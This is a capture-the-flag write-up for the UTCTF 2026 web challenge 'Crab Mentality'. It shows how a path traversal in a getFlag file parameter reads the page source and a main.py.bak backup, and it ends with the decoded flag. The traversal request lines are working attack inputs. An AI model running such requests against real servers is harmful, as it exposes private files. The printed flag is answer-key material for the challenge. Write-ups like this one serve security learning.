---
title: "UTCTF2026-Crab Mentality"
description: "CTF writeup - Crab Mentality (UTCTF 2026)"
date: 2026-03-07
tags: [CTF, Web, UTCTF]
category: "UTCTF 2026"
cover: ./cover.png
pinned: false
draft: false
---

### Overview

This challenge provides a web challenge with a queueing mechanism to receive the flag. When the player clicks the get-flag button, the system requires waiting 5 minutes. However, if multiple teams request the flag at the same time, the system cancels both requests. Nonetheless, this web app has another vulnerability that lets us get the flag faster without waiting.


### Observing the web application

When clicking the get-flag button, the frontend calls the endpoint:

```js
fetch('/getFlag?f=flag.txt')
```
The `f` parameter here seems to specify the file the server will read. This is a very suspicious sign because this kind of handling often suffers from path traversal bugs.

### Checking whether there is path traversal

I tried changing `f=flag.txt` to another file, for example:

```text
/getFlag?f=../index.html
```

Result: the server immediately returns the source code of the main page, instead of forcing a wait.

This confirms that the `/getFlag` endpoint has a path traversal bug, or at least allows reading files unintentionally.

From here, I can continue reading other files on the server.

### Check source code

In the page's HTML source there is a comment:

```html
<!-- future: rollback old style of site + server code from backup files -->
```
This comment suggests that backup files containing old source code may exist on the server.

Since we already exploited path traversal, the next logical step is to try reading the server's backup file, for example:

### Reading the server's backup file

I tried the request:

```text
/getFlag?f=../main.py.bak'
```

And the server actually returns the content of the `main.py.bak` file.

The content is as follows:

```python
import base64

_d = [
    0x75, 0x74, 0x66, 0x6c, 0x61, 0x67, 0x7b, 0x79,
    0x30, 0x75, 0x5f, 0x65, 0x31, 0x74, 0x68, 0x33,
    0x72, 0x5f, 0x77, 0x40, 0x31, 0x74, 0x5f, 0x79,
    0x72, 0x5f, 0x74, 0x75, 0x72, 0x6e, 0x5f, 0x30,
    0x72, 0x5f, 0x63, 0x75, 0x74, 0x5f, 0x31, 0x6e,
    0x5f, 0x6c, 0x31, 0x6e, 0x65, 0x7d
]

_k = base64.b64decode("U2VjcmV0S2V5MTIz").decode()

_x = bytes([
    c ^ ord(_k[i % len(_k)])
    for i, c in enumerate(_d)
]).hex()

if __name__ == "__main__":
    raw = bytes(
        int(_x[i:i+2], 16) ^ ord(_k[i // 2 % len(_k)])
        for i in range(0, len(_x), 2)
    )
    print(raw.decode())
```

Run the code and get the flag

### Flag

```text
utflag{y0u_e1th3r_w@1t_yr_turn_0r_cut_1n_l1ne}
```
